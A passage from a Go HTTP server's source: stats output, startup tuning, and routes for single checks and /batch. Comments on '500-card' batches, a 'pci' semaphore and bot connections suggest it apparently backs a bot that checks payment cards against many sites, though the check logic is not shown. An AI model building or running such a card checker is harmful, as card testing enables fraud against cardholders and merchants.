                "load_1m":        math.Round(load1*100) / 100,
                "load_5m":        math.Round(load5*100) / 100,
                "load_15m":       math.Round(load15*100) / 100,
                "uptime_sec":     uptimeSec,
                "active_checks":  int(activeWorkers.Load()),
                "workers_cap":    maxWorkers,
                "sites":          sc,
                "goroutines":     runtime.NumGoroutine(),
        })
}

func main() {
        // ── Raise file descriptor limit (Linux only, no-op on other OS) ─────────
        raiseNofileLimit()

        // ── Use all CPU cores ───────────────────────────────────────────────────
        // Honour GOMAXPROCS env var if set (Render/k8s sometimes inject it).
        // Fall back to all available CPUs.
        if v := os.Getenv("GOMAXPROCS"); v != "" {
                if n, err := strconv.Atoi(v); err == nil && n > 0 {
                        runtime.GOMAXPROCS(n)
                } else {
                        runtime.GOMAXPROCS(runtime.NumCPU())
                }
        } else {
                runtime.GOMAXPROCS(runtime.NumCPU())
        }

        rand.Seed(time.Now().UnixNano())

        // Load sites once into both the legacy slice and the atomic value.
        loaded := loadSites()
        sitesMu.Lock()
        sites = loaded
        sitesMu.Unlock()
        sitesAtom.Store(loaded)
        log.Printf("[api] loaded %d sites into memory cache", len(loaded))

        port := os.Getenv("PORT")
        if port == "" {
                port = "8081"
        }

        mux := http.NewServeMux()
        mux.HandleFunc("/", handleCheck)
        mux.HandleFunc("/batch", handleBatch)
        mux.HandleFunc("/health", handleHealth)
        mux.HandleFunc("/stats", handleStats)

        srv := &http.Server{
                Addr:    "0.0.0.0:" + port,
                Handler: mux,
                // ReadHeaderTimeout: short — headers should arrive fast.
                ReadHeaderTimeout: 5 * time.Second,
                // ReadTimeout: generous for /batch POST bodies (up to 64 MB).
                ReadTimeout: 90 * time.Second,
                // WriteTimeout: a 500-card batch × 30s/card = 15000s worst case.
                // Set 0 (unlimited) — the batch handler manages its own timeouts internally.
                WriteTimeout: 0,
                // IdleTimeout: keep connections alive for bot reuse (longer = fewer handshakes).
                IdleTimeout:    300 * time.Second,
                MaxHeaderBytes: 1 << 20,
                // ConnState callback: log connection lifecycle for debugging under load.
                // (Commented out — adds overhead in hot path. Enable only when debugging.)
                // ConnState: func(c net.Conn, st http.ConnState) {},
        }

        log.Printf("[api] listening on :%s | workers=%d batch_concurrency=%d pci_sem=%d cpus=%d",
                port, maxWorkers, batchWorkers, cap(pciSemaphore), runtime.NumCPU())
        if err := srv.ListenAndServe(); err != nil {
                log.Fatal(err)
        }
}
